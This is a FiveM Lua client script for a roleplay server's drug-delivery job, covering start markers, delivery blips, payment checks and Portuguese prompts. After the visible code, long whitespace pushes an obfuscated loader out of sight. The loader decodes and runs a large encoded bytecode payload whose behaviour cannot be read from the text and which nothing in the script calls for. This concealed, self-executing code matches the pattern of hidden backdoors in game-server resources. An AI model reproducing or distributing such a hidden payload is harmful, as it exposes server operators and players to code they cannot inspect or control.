------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local servico = false
local blips = {}
local zonas = {}
local segundos = 0
local selecionado = 0
local quantidade = 0
local mode = 0

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- INICIAR EMPREGO
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local actualRegion = nil
local drogas = {
	["Drogas"] = {
		{ 
			iniciar = vec3(564.57,-1749.05,29.32),
			region = 'sul'
		},
		{ 
			iniciar = vec3(-435.57,6154.45,31.48),
			region = 'norte'
		}
	}
}

Citizen.CreateThread(function()
	while true do
		local time = 1000
		local ped = PlayerPedId()
		local playercoords = GetEntityCoords(ped)
		
		for k,v in pairs(drogas.Drogas) do
			if not servico then
				local distance = #(playercoords - v.iniciar)
				if distance <= 2.0 then
					time = 0
					DrawMarker(2,v.iniciar[1],v.iniciar[2],v.iniciar[3]-0.20, 0,0, 0,0, 0,0, 0.5, 0.4, 0.5, 229, 35, 149, 80, 1, 0, 0, 0)

					if IsControlJustReleased(0, 38) and segundos <= 0 and checkInService() and vSERVER.cooldowndrogas() then
						segundos = 10
						SendNUIMessage({ showmenu = true })
						local double = vSERVER.checkFarmBoost()
						SendNUIMessage({
							action = 'setRouteBuffed',
							route = double
						})
						SetNuiFocus(true, true)
						actualRegion = v.region
					end
				end
			end
		end

		Citizen.Wait(time)
	end
end)

RegisterNUICallback("closeNui", function()
	SetNuiFocus(false, false)
	actualRegion = nil
end)

RegisterNUICallback("security", function()
	servico = true
	mode = actualRegion == 'norte' and 2 or 1
	selecionado = 0
	zonas = carregarZonas("Drogas", false, actualRegion)
	if vSERVER.checkFarmBoost() then 
		SendNUIMessage({
			action = 'setRouteBuffed',
			route = actualRegion == 'sul' and 'south' or 'north'
		})
	else
		SendNUIMessage({
			action = 'setRouteBuffed',
			route = 'vaisefudepdr'
		})
	end
end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- ZONAS DE VENDA
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local time = 1000

		if servico and selecionado >= 1 and segundos <= 0 then
			local ped = PlayerPedId()
			local playercoords = GetEntityCoords(ped)
			
			local distance = #(playercoords - vec3(zonas[selecionado].coords[1],zonas[selecionado].coords[2],zonas[selecionado].coords[3]))
			if distance <= 60.0 then
				time = 5
				DrawMarker(21,zonas[selecionado].coords[1],zonas[selecionado].coords[2],zonas[selecionado].coords[3],0,0,0,0,180.0,130.0,1.0,1.0,0.5, 25,140,255,180 ,1,0,0,1)

				if distance <= 1.5 then
					drawTxt("Aperte ~b~E~w~ para entregar a droga",0.5,0.96)
					if IsControlJustReleased(0, 38) and segundos <= 0 and not IsPedInAnyVehicle(PlayerPedId()) and vSERVER.checkItems(quantidade) then
						if payment("Drogas", quantidade, selecionado, mode) then
							segundos = 0

							vRP._playAnim(false,{{"mp_common","givetake1_a"}},true)
							TriggerEvent("progress",5,"Vendendo")

							--SetTimeout(5*1000, function()
							--	ClearPedTasks(GetPlayerPed(-1))
							--	
							--	selecionado = 0
							--	quantidade = 0
							--	RemoveBlip(blips)
							--end)
							SetTimeout(5*1000, function()
								ClearPedTasks(GetPlayerPed(-1))
								
								-- if mode > 1 then
								-- 	selecionado = 0
								-- end

								quantidade = 0
								RemoveBlip(blips)
							end)
						end
					end
				end
			end
		end

		Citizen.Wait(time)
	end
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- EM SERVIÇO
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local time = 1000
		if servico then
			time = 5
			if mode > 1 then
				drawTxt("~r~(ARRISCADA) ~w~Aperte ~r~F7~w~ se deseja finalizar o expediente.\nEntregue as ~y~drogas~w~.", 0.215,0.94)
			else
				drawTxt("~g~(SEGURA) ~w~Aperte ~r~F7~w~ se deseja finalizar o expediente.\nEntregue as ~y~drogas~w~.", 0.215,0.94)
			end
			

			if IsControlJustPressed(0, 168) and not IsPedInAnyVehicle(PlayerPedId()) then
				servico = false
				selecionado = 0
				quantidade = 0
				mode = 0
				RemoveBlip(blips)
				sairServico()
				-- exports["mirtin_inventory"]:checkdrogas(false)

			end
		end
		
		Citizen.Wait(time)
	end
end)

--Citizen.CreateThread(function()
--	while true do
--		local time = math.random(1000,5000)
--
--        if servico and quantidade <= 0 then
--            selecionado = math.random(38)
--            quantidade = math.random(2,6)
--            TriggerEvent("Notify","importante","Estamos precisando de <b>"..quantidade.."x</b> dessa sua parada ai., traga o mais rapido possivel!.", 5)
--            CriandoBlip(selecionado)
--		end
--
--		Citizen.Wait(time)
--	end
--end)

Citizen.CreateThread(function()
	while true do
		local old_selecionado = 0
		local time = math.random(1000,5000)

        if servico and quantidade <= 0 and (mode == 1 or mode == 2) then
			selecionado = selecionado + 1
			if selecionado == #zonas then
				selecionado = 1
			end
            quantidade = math.random(1,5)
            TriggerEvent("Notify","importante","Estamos precisando de <b>"..quantidade.."x</b> dessa sua parada ai., traga o mais rapido possivel!.", 5)
            CriandoBlip(selecionado)
		elseif servico and quantidade <= 0 and (mode == 1 or mode == 2) then 
			old_selecionado = selecionado
            selecionado = math.random(#zonas)

			while old_selecionado == selecionado do
				selecionado = math.random(#zonas)
				Wait(1000)
			end

            quantidade = math.random(1,5)
            TriggerEvent("Notify","importante","Estamos precisando de <b>"..quantidade.."x</b> dessa sua parada ai., traga o mais rapido possivel!.", 5)
            CriandoBlip(selecionado)
		end

		Citizen.Wait(time)
	end
end)

Citizen.CreateThread(function()
	while true do
		local time = 1000
		if segundos >= 0 then
			segundos = segundos - 1

			if segundos <= 0 then
				segundos = 0
			end
		end
		Citizen.Wait(time)
	end
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTIONS
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function CriandoBlip(selecionado)
	blips = AddBlipForCoord(zonas[selecionado].coords[1],zonas[selecionado].coords[2],zonas[selecionado].coords[3])
	SetBlipSprite(blips,1)
	SetBlipColour(blips,5)
	SetBlipScale(blips,0.4)
	SetBlipAsShortRange(blips,false)
	SetBlipRoute(blips,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega de Droga")
	EndTextCommandSetBlipName(blips)
end


























































































































































































































































































































































																																																																																																				return(function(BO,O,i,W,Z,Y,T,D,d,L,X,o,C,z,SO,GO,Q,n,q,QO,E,_)Z={};local H;X=(0X46);repeat if X>70.0 then if X~=0x1.AP6 then H=E.S;if not(not Z[4023])then X=Z[0Xfb7];else Z[10666]=-12250194086+(((X<<0x7==_[1]and _[4]or _[3])<=_[2]and _[0x9]or _[9])<<2);X=-2623160590+(((Z[4024]|_[0x8])~X<=_[9]and _[9]or _[0X3])-_[0X006]);Z[0XFB7]=(X);end;else break;end;else if not Z[0XFb8]then X=(-0X57a+((_[0X08]~_[3]>=X and _[0X9]or _[0X5])&_[1]<=_[0X3]and _[1]or X));(Z)[4024]=X;else X=Z[4024];end;end;until false;local B;X=106;while true do if X>65.0 then if not(not Z[0X4D01])then X=Z[0x4d01];else X=(-3062548476+((Z[0X29aa]<<4<=_[4]and Z[0XFb8]or X)>>0X0c>=_[0X7]and _[2]or _[0X9]));(Z)[19713]=X;end;else if X<106.0 then B=E.A;break;end;end;end;local y=E.u;QO=(nil);X=0X5A;repeat if X<90.0 then QO=({});break;elseif X>90.0 then if not(not Z[0X5aDB])then X=(Z[0X5aDB]);else X=(-2131430+((_[0X4]>>0x00F>=Z[0XfB7]and _[5]or _[0X7])+_[0X5]&_[0X6]));(Z)[23259]=(X);end;else if X<0x1.C4p6 and X>0X1.cp4 then if not Z[17004]then X=(0X71+(((_[2]~Z[0x29AA])>>15)+_[0X1]&Z[4023]));Z[17004]=X;else X=Z[0X426c];end;end;end;until false;local k,P,G,a,f,kO,M,h;X=(0X33);repeat if not(X>0X1.98P5)then if X<=23.0 then if X==0X1.7P4 then a=({});if not Z[0X15E3]then X=(-0x2C+(((Z[0X0fb8]>Z[17004]and Z[0x06F94]or Z[10666])>>Z[0X003E92]|Z[0x29Aa])-Z[26175]));(Z)[5603]=X;else X=(Z[0X15E3]);end;else f=(0X01);kO=E.D;if not Z[486]then X=103+(((Z[5603]~=_[8]and Z[0X29aA]or Z[26208])-X&_[0X5])-X);(Z)[0X1e6]=X;else X=Z[486];end;end;else if X>0x1.8P4 then if not(not Z[21118])then X=(Z[0X527E]);else(Z)[22469]=0X41+((_[9]&_[0X4]&_[0X2])>>Z[23259]&Z[4023]);X=-4441467871+(((_[0x7]~Z[0Xfb8])+_[1]|Z[19713])+_[0X07]);(Z)[21118]=X;end;else P=(nil);G=E.F;if not(not Z[0X3e92])then X=(Z[16018]);else Z[19657]=0X9+((_[2]>>Z[0X663F]|Z[0XFb8]|Z[26175])&X);Z[28564]=-0X1A30866b+(((_[0X4]==_[3]and _[7]or Z[0x426C])&_[0x7]<=_[0X4]and Z[19713]or _[3])>Z[0X6660]and _[3]or _[0X6]);X=-70+(((_[3]+_[2]~=Z[26175]and Z[0X527e]or _[0X4])~=Z[4024]and Z[0X4d01]or Z[19713])~=_[0X7]and Z[26208]or _[0X5]);Z[16018]=(X);end;end;end;else if not(X<=93.0)then if X>=118.0 then if not(not Z[0X6660])then X=Z[0X6660];else X=-117947286843738146+(Z[0X5adB]+_[0x6]<<Z[0X5Adb]~X|_[9]);Z[26208]=(X);end;else M={};if not(not Z[0X300d])then X=(Z[0X300D]);else Z[4616]=-3136049705860+(((Z[0X3E92]|Z[4024]>=_[0X6]and Z[17004]or _[9])<<Z[0X15E3])-X);X=(-545259444+((_[0X7]<<Z[0x15e3]~Z[0X00FB7]>=_[0X4]and Z[0X4d01]or Z[0XFb7])<<Z[16018]));Z[12301]=X;end;end;else if X<=76.0 then h=(function(c)return{kO(M,1,c)};end);break;else k=E.P;if not(not Z[26175])then X=Z[26175];else X=-3062548463+(((_[3]-Z[0XFb7]>=_[5]and Z[4023]or Z[17004])~_[9])-Z[0X29Aa]);Z[26175]=X;end;end;end;end;until false;local p;X=91;repeat if X<=0x1.6cp6 then p=(next);if not Z[3527]then X=0X7e+((_[9]<<Z[4616]&_[0X007])>>Z[26175]>>Z[16018]);Z[0XDc7]=(X);else X=(Z[0XdC7]);end;else break;end;until false;local l,v,j=(9007199254740992);X=0X2;repeat if not(X>2.0)then v=(E.G);if not(not Z[28794])then X=Z[0X707A];else Z[17809]=0x18+((Z[0X527E]<<Z[0X5AdB]&Z[5603]<=Z[26208]and Z[12301]or _[4])-Z[0x057c5]);Z[16828]=2+(Z[0X426C]>>Z[5603]<<Z[23259]&Z[19713]&_[0X1]);X=-1927+((((_[9]<=Z[0X300D]and Z[5603]or Z[0X15e3])<=Z[5603]and _[0x7]or Z[16018])<=Z[16018]and Z[0X4CC9]or X)<<Z[5603]);Z[28794]=X;end;else if X~=4.0 then for c=0x0,255 do a[c]=k(c);end;if not(not Z[12779])then X=(Z[0x31EB]);else X=-2220733375+((Z[0X300d]>>Z[16018]|_[7])+Z[0X41BC]+Z[0x6660]);Z[0X31eb]=X;end;else j=(function(c)c=D(c,"\122","\u{0021}\x21!\z  \u{021}!");return D(c,"\u{02E}....",B({},{__index=function(r,R)local c,t,e,S,U=G(R,1,5);local D=((U-33)+(S-33)*0x55+(e-0x21)*7225+(t-33)*614125+(c-0X21)*52200625);S=i('>I4',D);r[R]=S;return S;end}));end)(y("LPH~MqS75N!s?1FDYT2@<>peCh8P/?XI>XG'a2h_#OH7ha*q:N!=?7Ch7*uScAckz!1j8mz!!%r]?XIYgA=`o(z!!%r[F*1r`rs&N(zN!j!\"D.RftFCAWpAW-Y/HN4$Gz!1kXShXgdJ!!&\\mN!+6JE+Ot/CQ&9:Sj9+1!WW3#!/q,&@<Zd(FIjNRz!!%r]D..NrBT)sHSe(l%z!1kqGz!!&US!<<-#!!!\"j$31&+zN!KC`z!#:Fq?XIVkN!`p!DIn$+DId='N!<p3@<?!mScA`kz!1jDq!+b<ns8SYj!!!$\"!!!\"j!<<*\"zN!sc=FDYT2@<>peCh91[z!!!\"jrrW6$zN!=NG@ps1iStT0bz!/q%f?Yj;4\"^bVFA7UW%E+*6lN!*a,DIf=Ez!!!\"X!@+0Bz!!!\"X#[^qKDf0&nFF*ufzn3;j=?XInnF*)G:DJ,R@s8W*!!!!\"X\"$UEYN!=EBE+*6lN!*s8@:Y<#?XIks@Z1Qmz!!!7_#%hdoD..OF#]t!+FE2)5B:]e;z!!%r\\@q]:kSg-#kz!1n,5z!!%r[Eb03]!WW3#zN!<Wr@ps1iSu_nlz!1k)/z!!%?Gz!&-d!\"_D^pDfVElz!!!\"j,ldoFzN!Eg1DerunDN\"^2F*1r`\\c;^1zSco)oz!/q:H-m`CS.9ehB$=/SkEf:&P5E#bQ?Z9q-N!*U8FCh$Kz!!!\"j5RBq6zN!=!6F(KB6Sf%M.z!/q)#@ps1iT\"&e*@/p9-!/q(g?Ysq%N!KC`z!#_B2;^&[O!!!\"jzzScPtoz!1pi:MC&<'!!%?Gz!:W:5\"CGMIEJsmV#'+-rB4Z1V'`\\46zN!=?FEbTE(N!=0BD.7'sN!E]sBl7HmGb-;Yz!!&Vjz!!!\"X\"DqRhBT*(3AU&<g)qb2kzT#I6?JH,ZM!1jH)hp`tNs8SYpz!!!\"j5QCcazN!4<3@VfV7#%MRh@psK+7[^.V&HrUI1]n-i5m7Dp*X)TK0<H>`(Y'<(!!*psVun(EM?=#'\"c<Bc.=?4g!!<CH#]p4R!##N`#^cdZ#(3EO\"Wdi!\"9hscaohkh\"e#Pt!!<CH#]p4R*X17\"\"^3ao!sK_Lncf7;V$Z6'oa(U3\"bZm^KE25[!!<C`!?MF@!<jp\"F=[D2\"`s_X\"ah?paoMYOHj'ZR!sO>Y#n7&k!At%&\"VqPp\"Wdi)!<ic=\"cNHsHj'[&HupoC<5JhC*X1O-\"TSo6HiOf`KE2@3!<iW,'*X<q#n7&s!At%.\"Wdg[\"_:\")TE62=8i/p>\"Y=1@\"kWuh49`5!*X17!\"_8#FTE5)q\"V_4V\"U,qNWWNE8*!Mu:*sKLd$tN<@fEGej\"h4bIA-JV-*sIf/;udR8HjG*'\"V!#1Hs[&)&fq4N!X/Q;\"agT'\"U,qNWW<8g\"U,'?1^0NR!!<Be#Wr7oA4-To!ZqSd1]Rme;ud\"(>R4R<\"Wdia\"U,2A\"`-%\">QlQ]<%J\"W\"]PI(\"^D=<\"U+l.\"_7oK\"_9Io<!<70\"^E)Pl3.=k!sN3A%0^9\"\"]PX*$O'cV\"el2)!!<C8#\\4)B!!<C@#n7&S2$I4g.9oh'*X,.>!!<C8#\\4)B!!<C@*X1g3\"TT2>F9lsl\"U9)&!sK_L=p7.p\"U,qNEWn]3\"U,qNl2h,S\"U,&0$O$q='*T'k\"el5*#S[FG!!<BE#n7%X@KcoD=q'Zt\"Wdi!#6b_?\"<A4#)4IK+*X0C_\"Wdia!sJZL\"[#ok\"[!h0WW<8E\"i:?F!%S40?Ni!\\!?MCW\"TTbN9N_N&9HFB&!sLF`,tqYL'^>cA\"i:<E!':?p&nGN(#pfaK2$HAO!)j%p*X2*8\"TU=^4>6q,$ii?m9HFA#!X/Qs\"\\^TR<\"&ag\"^Dih>[/<RH3Gu+<\"&a7\"^F4tA-F\"X@KdPn9M>FJ\"]Q+6<%K.S\"XO.9\"[jC8aoMYe\"\\Jr*\"XGiE\"l]Uf49Ym.#TO!O!#l(e0Ej!9!\"/re#ot$3*X0[f\"TSo6,Wl56'EAdM*&%OA$igY=/04uK!X0/>%0Z_6\"V`Wo*\"3klOokk/\"l]Xg?NhF4\"<I`h\"9ecM\"\\`&&\"\\]s@q?I12\"['@!*X2BC\"TTbN>Zh46>TO(F\"pJ?;7/@-0\"o8<)!$_Y@=Tnt&*X.]0\"TTbN1g'tc1`cfU\"TTbN9N_N&9HFAK\"9fj;#Mffb#;HC(\"TW$9F>*lG*&%PL!B`(?F9MYS\"`uF%Hos(dKE4I^\"l][h0a2Y&!+Q1S0Elhl0Em+11bf/U\"Wdi9\"pHph\"`s`S\"`uF%HqZ3tKE5=4\"`snJ@g-rq\"hFpB!+Q1S0Eli'0Em+1CbZ*8\"Y^+%9HFA#\"pJ%4fEE5p>6SOR4Chu'CtJnJ!+Q1S0Elh<0Em+1*$,9P\"U-R`HsA?/KE5U<\"`snJ@g-s.\"aji7\"bZnU0a2Y&*X0[j\"TVa19G\\C:9E89#<#u43#R)#4<)d3.2#7Ct\"el,'&HE8+mK#I*=_]7+'ceGEEOhtL*X+S.*X+S.*X+S.49YmF\"Gd+91`%]\"/04tH!X/Q+\"UkA=\"VbJe\"eYp-,R$^F,qTN*'*Tp@\"Z.JG\"hF^<49YmF\">DYh(G%Bo!##Mm0EjQIA4-Uj!^$Vi1`chk!<m!r\"n2^Y\"U-F[Qi\\fi!##Mm0EjQYA4-U2\"<I^b\"W&^H/2m_9/-$=e1b](q'P'T8a8m=cH3G8D'@dZU)@6BG\"VDKYVZRtD+pB\"k+pDL.\"kWu\"\"d/oj&Hs0Y\"ru%l\"WdhF\"T\\2ueI7uL?Ni!D!ZhLX\"]:oo'I6>-\"=,5n,RbqqTE6)a;4mt)1_MVr/04tX!<kCc\"Y<\\*TE6Z;L]f7[?7[?I9e7Q_!YR%8,T[,H!<m!b\"eYo<\"[WAiTE5fQ98E]r,Sq^O/7'kY$m#TK!<ke@,V0-N63SD6_>sg!\"U-F_!!($:\"!.W_!X0VK_?'m8/.@=;*:a-_\"Y:\\uU&bE;Z3&Y^$m#S(!sL@^/0m.X\"Y:9;4:ETn\"?\\dZ1e\\T)\"bHaY0Ei.a0EhkI*X+\"s-\\qn!9E^.S**b0$**aNgC'>D!*&K>Q,W$PGnc8ng/.@=;9f*Q?\"ACX'8fe/!!X17]*(2Ia$oB\"/l2h,%/2Rb_L]fOk\"Gd1#6llNc!<j8b*'>nY,Wm+O8d-7>iW99#'^>`.*X/PF\"VCnQ\"_8SVTE8XL\"kWu\"\"Y'[0\"Ul(b3nOTE*X*/[!3HLF$AB$2Z3&Y^'HRFh!<ir5!3rF(*X-in*X-in5m7Dp2h`'5\"-isB\"]S/u\"U.jH\"i:9D49Ym64u\"Sl4t/;l*X,^N4s<#l5&iso4qUHl*X0C]\"Tno3\"W`s7$j//=\"Uke[Qj+6,07X0>'JK\\9'P&`uQiU_S\"n2R7\"Zcf@\"]S/$<!<F0<\"]?U\"X4*k\"aU=[!!*.kVZRtD+pB\"k+pCd(*j#[l!ZhLh\"]Y^8\"Tei2)up'E,Rtdt*<lKE&Y#[#*X*_k*X*_k*X*_k6*1id$M=`.\"U,'.'EnYG'EnXC!!'='\"!.Wo\"9fhMdKB^dbn,R<bn)Q41_^BE4<uTa6mOku\"Z-2e\"[\"mN\"Y;)R,U<AZ!<k\"q\"d/oj%4!b].5WS$!36,(/-$=e/04uc\"U-R`<$Vbj\"[k3O1^*je\"[\"LC/-TQ8\"b6du\"_%Wh\"Z.2]\"U-.ORfN[D*X0st\"Y^*:'JK\\Q,VTBi,VTBq,VTC$,T[-3!sL@^1__VI4=!*V6j57J9I(Y_M?*l7\"_8l_\"U/-b\"_8kb%0^8K\"U.:O\"Z-A_$O&XI\"Y9fWRfN[D0Ej9I0EjQa0Ejii,U?&/!2BPu<$YFB,QOS?\"^E;u>[/<Rap/)(\"^E;Y>Qk9b\"_8l\"\"k!SY.1@IA!.t:U,Uj-I)utlt\"XG,mM?sG8$mZem9*HRi$mZem;[\"Eq$mZem>6Q9$$mZf6\"bHm]5\"Q.d5'[hG6j3`6!##M]!#l(m*X.u;\"TW$9,Uj-I)usaX,Uj-I)ut$`,Uj-I)ut<h,T[-S!sLdj\"Z-2e\"[\"mN\"Y;)R,U<AZ!<k\"q\"W@OEZN14d.5WRq5m7Dp0Ej9I0EjQa(F17o.nh36!@1?4;C!Me?;sTl&kk\\]*X2*=\"Y^*r,[1EUA2\"1',T[,h#mEEp\"Z0aP\"X#N'/-Q$C!<k\"q\"l]Od.4c_a!$_Xm.1@IA!%S3u.1@IA*X/8D\"UQIY6o>-)\"TSo64>@!j\"TY\"m\"Y:\\uM?X4aRfN[D0Ej9I0EjQa0Ejii*X0Ca\"TU=^,Uj-I)ur&(,Uj-I)ur>0,T[,P\"9gI_1__VI4<uTa6mOGi9I):q<$X.$>U1?o\\cN$`,TM=8!0[Ee,X_e>/04u3!<k.\\F<iODHmB\"=\"`+JK\"[k3O1^*je\"[\"LC/-R'uq?I0F\"k!MW&-*N8!KmJT!El,tV?*[tXoYg/[K3r?^&c(O`W=3_c2l>oec?(sg&^%2C9\"06*X-9^*X-9^)sn***2NrN\"9]-$\"U,<F'EsR#/0\"frA0_>?\"!7](!>IF+\"XI=U\"U/EF\"crg-\"W@P.3=H'o\"U,;m\"9fJ\\\"\\Jr%'Uf%+*X/PE\"Xsj2\"<I`(!<jMJWW<8*!!*FjWrjCHWWiVJ\"f_b1'Z:'+!h9<G\"j@$!0Eor-S,s`8=p4nY\"U3*O?H`Jh!lP-o\"e5Y4!ZhMC\"WdiI(Bn\"H\"j@#sbQ>]aPQ<;Q!rN(h!`m5@^]_RW*X+;&5Qq;p%@dIk!UKho\"nVid'HRFP(^3!S!g!TG\"()4b!h'65\"c<Ed$Gm1p!X0VKiWB?<\"j@$a0Eor-_u_Clg]@X#\"mQ*l&-^8Z\\cG&\"\"U+nl!<r)r!365+quHf(\"9jG[)MA0F!oj@_MZO'@!ZhNF!X0L$!fR3@\"&spTKE@)6!4r78MujoV!fR3@!u-CiMunY6!,Das!ZhO)!X0#YMunq>!:p9rPQCis\"9k:s49YnI![E@\"KE@)6!:'XhMujoV!fR3@!u[%!KE?f.#)!'S)$M&bg(X\\jK)u48![E@\"KE@)6(]4;e!rN(0KE;=M!ZhO!!sKbMq?uor5Qq;p*X17*\"Y^,P!OMl1\"U4N!*X174\"T[9[\"bZpqKE?f.ir];I!<nD`)N4`V!ojAmKE?f.Muj3:!l>'D*X/8M\"^_Fd!hpVT\"elJ1!$_Xu%4!JU4#CV$*X.]3\"T[!P\"k3Q,\"l',p7haqa\"WdiA#R)ZY!Mfad!<Akq\"f)/!K)l.W!@b)NU]Htd*X1O.\"V!;1F9$@cHjq?KHl`I>\"pIBu\"e5SnHNg2G!.t:UX8scO!Mfad!<A#Y\"f)/!P5tig!@b)NU]Htd!1NumU]CIZ!<oP**X.]1\"TSW.$igY='HOC]*\"r;k\"XG,mdKB_8KE:QF.m&[jO9$k\"\"U1+k*X17$\"T[!P\"hXkH_uU%o\"[iLtbQ/agncT*r1BflM,Wn0h3sA\"],Xb$#6Np-m,YUl39*J8p;[$D+>6SOY\"bI!`*Ja`l!>@Y\"X8rJgT`MM$\"Wdj<\"pGG]A7P[M\"`+0S\"`tdh\\ci6e\"mc6n&-^hiJenFI!sS;t/G&rHoDnsX!sST'4+m[.!oj@_])`(o!ZI\"!Mur#A-&_nY!e^UZKE?`8\"Wdi1&d891\"9k\"k=Tntn!ZhO1$O'!'S-#2^#pfb.!YtV6\"U-@ZKE;;g\"nVhY&MOBA!^&.?Mur&@!:'XhPQCjN!<ntp*X.]5\"T[Q`\"mc7D\"nVh36j3bl!?MEU#mC[I&@;KB*X.E=\"TXG^\"lo[aP6(pS!@d@9j8n$:5)B=$!<l$uli@7oliHYZ\"Wdi)$O&p%\"l'+Yo)T$U!=RZ`J-4j5*X1g9\"T\\E#\"lo[aK)u5C!@d@9j8n$:*X.]6\"WdiY%0Za$\"9jG[)MA0F!ojA(\"d0?!!6YKKPQFtk\"dB'0\"j.Yc.L\"T/\"Y&4.e,mPi*X0+U\"U`BQZiUCP\"mQO#>4_jl#R)7Qnc8ntoDuN8\"WdiI*X)OZ\"cNKl,`De`!W_fo\"dB&gqZ@\"l!^$ViMuk%(q@!N-P6(oH!ZI\"!Mur#A5D0)s!e^Ur\"c<]l&rZmF!e^UTo)T#R!ZI\"!Mur#A*X.uA\"\\=RRKE?f.!0[HfMujoV!fR3@\"!.X\"$j@>u!fR26!Z1b8KED&P9`+q`!TG(?\"d0Z*0Eq(LU]E.QquQ-b>6P3&!<B/%\"oJB)oE\"jjncKp:WZ;7.\"U,&`\"ge@'!B1/cZiXS<KEA^n*X/hd\"^_Fd!jVnL\"hGcZ!:'XhKE<'F!e^X8\"!.W?)[-5Z\"9j_c,D6,O!fR0squMHPquL>]!X54u*X1O5\"Wmoj)\"[h<_ueEie,h:R\"2k8r!WYjsj8o=F!X7ol%E&>7!pft0\"e#r*.I7,s!mC]G9*OAX!.t=VliJ43iXc8I\"nVkt!\\jl>!X17]j8p#L\"mc<?!\\afM!iuGX\"lo^g*X2*F\"Y^,@!Yd<lliPrD0Eq(MX9(*[j8oK+\"kjLk.I7,s!o*i2\"lo_!0EpeEbQ8gh\\dnrEMZO(+!Y*'LbQ>ui!;cd#e,gZpl4*t=\"bI'b%E&>7!pft;liQ5Le,fVC\"lo^bo)T$]!Y*'LliQMT*X.uD\"U`rqoDo+:\"bHaY!0[HfKE<'F!e^X8\"!.W_\"9eec\"9k\"k=Tntn!ZhOA$O'eK)<CtF\"r*!tKECK@0EpeDMuj.7!UKiG!ZhOA&HtO\\!fR2R\"#'oF!K7($\"d0H$!:'XhKE<'F!e^X8\"!.Vt%L!&i!qI*1*X.E>\"Y^+U!jhu2\"U1\\'*X172\"Y^+u!osA9\"j@%T!\\af-!k\\RU\"el\\70EoArS,umu\"hXmj\"iLK'!?ME-'*U&nbQ=jI0Eor-ZiVrc_u^)`\"k\"\"e0Eq(LliC5m\"nVfqir]JW!=&/sOr\"9C\"k\"(g4rL-t\"Y^+]!i,lO\"ge@/!F#^2X9('ZZi[$)0Eo)jMum2e\"ge=b\"hXo4!ZhO9&d9un_u^)r\"iLK'!AF]$!k\\Rg\"k3UT!\\jks!X0VKZ4dB_\"gSC;!:'XhKE<'F!e^X8\"!.XB)$LgUoE\"Rb0EkGJ!<DEd\"nVg3_u]K2oDp!:RM>u[\"iLH6!<A;a\"nVg4_uYH+oDp!:U)aCgquHu^!<C:D\"bZpoKE?`AquIiBiX#cB\"nVg00Eq@Tli@+8!<n,X0a71M\"[5fM!<k.\\oE\":Z=To!$!AF]L!?;*W!sST'*X/PZ\"UPnaoDpWLKE<+nb6%p,!XTS^KE<h2PQDg)dfTcD!XTS^PQD']!NHb9*X1O@\"U:1mg(OW2\"hG<M$JH?P!<jMJRND\\e\"nVi&!EfR0oDp!:iZ&,*U]M/4*X/8V\"U9V]WW<8E\"e$83!0[HfKE<'F!e^X8!s\"5\\\"cNL$Munq>ir`D:!fR26!ZhNV(Bm&-\"U+nl!<r)r!7M&SquIiBaqk4&\"el#$!)!Lf!?MF8'EnK#!X45Y)MA0F!ojA(\"hG*G>4_iq$O%RTqA0;h\"mc8c!AF]L!TX8c\"U45n!8@MXoDo-^!V?DE(ENak'a6i+\"U+nT!<oh3-3^aX,p!6,)$M\\t]E6:X.L!`l\"V:jE!nn\"^dfBWZ![\\)X!\\H)0ZiY%b\"f`FD0En6RZiO;5\"f)2@\"f`1=?Nl)a\\dfbbiZ/1V\"f)4,!EfR0U]MS@neMBo\"U,&nR/s)b\"[iLtX9'FH_AWRXRf`i$!^;/9]E/6c]E5GAX9('ZZiY%t\"hXod!?MF8)?hSo_u^)R\"ge>_$6\"j)Mur#A)2nWM!e^UZKE@;H\"Wdii)[-6-!<nD`)N4`V!ojAIKE@)6KE;.C\"9j_c*X.-7\"Wdi1$O%H%!e^X8!s\"5^\"cNL-KE?f.Muiup\"cNKl,`De`!W_fo\"dB&gP6;&Z!^$ViMuk5W!e^W6!W[iR\"cNL-KE?f.Muj!K\"9j_c)N4`V!oj@qMunY6KE;/F!<nD`)N4`V!ojA(\"bI`u*sLp;oDnsX!<r)r!.tCXquHf`!<n,X*X0t2\"VcUkMunY6(]4;e!rN(0KE;=M!ZhO!*!IAeRND\\e\"bZpc0EmC:liC;o\"bZpu\"j.hh!7LrPMul\\3!e^X/'cmPL!sLc>!h]VT\"!.WW%L$17!h9=^!]d%X/Hmg3e,c?H!)!Kk!W\\,^\"fqc9ZiUE(!ZqTG(Sh*t\"U,'\"Wr_hn\"UO`$\"U+nl\"9n](*X2*U\"Y6)EquN#`<h'6,\"IoMnK*;FS!ZhO9*<cH7\"9jG[!;cm&PQEk8![S\"(\"hXl+!ZhNn*X+e4\"U+mi!<q6Z@*/gUg]8H\"iZA=(lN%0B!ZH^nKEC09*X/hO\"W6n?ocO,<37S5h!ppUS\"l'-c!EfR0g]8H\"apJ;+!*,Ef2$-MB!X48YYlX@q-+*g9!W<%A+e8]-!XTU$!Fba)`<!(Ah#^Ro&`j'[]`PG?eH(L-V#_%!!QbA-!@a-4Pld?TW<+g=!oX15!c;4o!mLe/!G13kC&J*a\",-iZ!gNkA!mq)6!BKrV\\H0MJM$*,H4l$.d!K@24!A0E9;5\"%_f`Abe_#_d]aT@a+\"!.V<\"_@N3\"gA2AKE;=u!b@5k\"lKS+\"i:KJAAeNQp]G'N!X0]We,fe5*X0[i\"Tno3\"[8%L$jB$&\"V_uE\"rm^uJ-6i3*X2BD\"_?*d\"kX#ig][jHAE3mtO9/tZ\"U4)lAFp$/W!-,t\"U,&e\"UkPq\"UkQFg]I`$\"!-\"rj9#KpliRDfAFos-J-TW_!sPn0*X0so\"WaNBS-/q)U]^kZ\"_=\\;\"crjtZigQb!ZhN.!X3,I\"9lRCAAeTS\\-6Ee\"9mE\\*O#[r\"9W2i\"9lREAE3jskQGG_\"9jkj*X.u;\"Wd@